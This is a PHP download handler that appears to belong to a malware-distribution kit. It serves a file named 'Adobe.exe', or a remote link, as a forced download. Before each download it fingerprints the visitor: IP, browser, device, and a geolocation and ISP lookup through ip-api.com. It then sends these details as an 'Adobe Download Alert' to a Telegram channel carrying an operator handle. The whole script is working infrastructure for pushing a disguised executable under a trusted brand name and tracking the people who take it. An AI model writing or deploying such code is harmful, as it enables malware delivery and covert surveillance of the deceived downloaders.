<?php
require_once 'settings.php';

/* =======================
   CHOOSE DOWNLOAD SOURCE
======================= */

// change these ONLY
$USE_LOCAL_DOWNLOAD = true; // true = file download, false = link download

/* ================== DOWNLOAD MODES ================== */
$localFile = $USE_LOCAL_DOWNLOAD
    ? __DIR__ . '/files/Adobe.exe'  // local file (download)
    : '';

$remoteKey = $USE_LOCAL_DOWNLOAD
    ? ''
    : 'myLink';  // key from $DOWNLOAD_LINKS

$isLocal  = file_exists($localFile);
$isRemote = !$isLocal && !empty($DOWNLOAD_LINKS[$remoteKey]);

if (!$isLocal && !$isRemote) {
    http_response_code(404);
    exit('Download not available.');
}

/* =======================
   FILE INFO
======================= */

if ($isLocal) {
    $filePath = $localFile;
    $fileName = basename($filePath);
    $fileSize = filesize($filePath);
    $fileType = mime_content_type($filePath) ?: 'application/octet-stream';
} else {
    $filePath = $DOWNLOAD_LINKS[$remoteKey];
    $fileName = basename(parse_url($filePath, PHP_URL_PATH)) ?: 'download';
    $fileSize = null;
    $fileType = 'application/octet-stream';
}

/* =======================
   USER INFO (for Telegram)
======================= */

$ip = $_SERVER['HTTP_CF_CONNECTING_IP']
    ?? $_SERVER['HTTP_X_FORWARDED_FOR']
    ?? $_SERVER['REMOTE_ADDR']
    ?? 'Unknown';

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');

$device = preg_match('/mobile|android|iphone|ipad/i', $userAgent) ? 'Mobile' : 'Desktop';

$browser = 'Unknown';
if (stripos($userAgent, 'Edge') !== false) $browser = 'Edge';
elseif (stripos($userAgent, 'Chrome') !== false) $browser = 'Chrome';
elseif (stripos($userAgent, 'Firefox') !== false) $browser = 'Firefox';
elseif (stripos($userAgent, 'Safari') !== false) $browser = 'Safari';

/* =======================
   GEO / ISP
======================= */

$location = 'Unknown';
$isp = 'Unknown';

$geo = @json_decode(
    file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,isp"),
    true
);

if (!empty($geo['country'])) {
    $location = trim("{$geo['city']}, {$geo['regionName']}, {$geo['country']}", ', ');
    $isp = $geo['isp'] ?? 'Unknown';
}

/* =======================
   TELEGRAM LOG
======================= */

/* ================== MESSAGE FORMAT ================== */
$message = "🔔<b> Adobe Download Alert </b>🔔\n\n" .
           "📁 <b>File:</b> {$fileName}\n" .
           "🔗 <b>Type:</b> {$fileType}\n" .
           "👤 <b>Mode:</b> " . ($isLocal ? 'Local file' : 'Remote link') . "\n" .
           "🧬 <b>IP:</b> {$ip}\n" .
           "🕒 <b>Time:</b> {$time}\n" .
           "💻 <b>Device:</b> {$device}\n" .
           "🌐 <b>Browser:</b> {$browser}\n" .
           "📡 <b>Location:</b> {$location}\n" .
           "🧭 <b>ISP:</b> {$isp}\n\n" .
           "📍 <b>tg-@Meyerlowkee</b> 📍";

// Send Telegram
sendTelegramMessage($message);

/* =======================
   CLEAN OUTPUT BUFFER
======================= */

while (ob_get_level()) {
    ob_end_clean();
}

/* =======================
   DOWNLOAD HEADERS
======================= */

header('Content-Description: File Transfer');
header('Content-Type: ' . $fileType);
header('Content-Disposition: attachment; filename="' . $fileName . '"');
header('Content-Transfer-Encoding: binary');

if ($fileSize) {
    header('Content-Length: ' . $fileSize);
}

/* =======================
   STREAM FILE
======================= */

if ($isLocal) {
    readfile($filePath);
} else {
    $fp = fopen($filePath, 'rb');
    if ($fp) {
        while (!feof($fp)) {
            echo fread($fp, 8192);
            flush();
        }
        fclose($fp);
    } else {
        http_response_code(502);
        exit('Failed to open remote file.');
    }
}

exit;
